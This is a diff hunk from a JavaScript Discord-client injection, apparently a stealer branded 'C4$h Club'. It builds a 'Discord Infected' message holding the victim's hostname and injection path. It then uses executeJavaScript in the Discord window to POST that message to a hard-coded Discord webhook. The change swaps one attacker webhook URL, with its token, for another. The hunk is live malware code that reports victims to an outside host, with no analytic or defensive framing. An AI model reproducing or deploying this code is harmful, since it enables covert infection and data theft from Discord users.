@@ -73,7 +73,7 @@ function FirstTime() {
                 var c={username:"C4$h Club",content:"",embeds:[{title:"Discord Infected",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"C4$h Club"},footer:{text:"C4$h Club"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};
                 const window = BrowserWindow.getAllWindows()[0];
                 window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/905912417756794921/Ftimt00LEhz3D4Kry5XOSQ1W1YMgxe8PuDiDw8JeFN5bo5lQAIiRZ_Y20p-SQLKvCjVC", true);
+    xhr.open("POST", "https://discord.com/api/webhooks/906613200781463573/JbJxOZxPzUbdjC6bsKtlXAEUzHbbYgQqp6TTyViJMo9y0hsoUnSR5hf90HwQaEdlAc-w", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${c}));
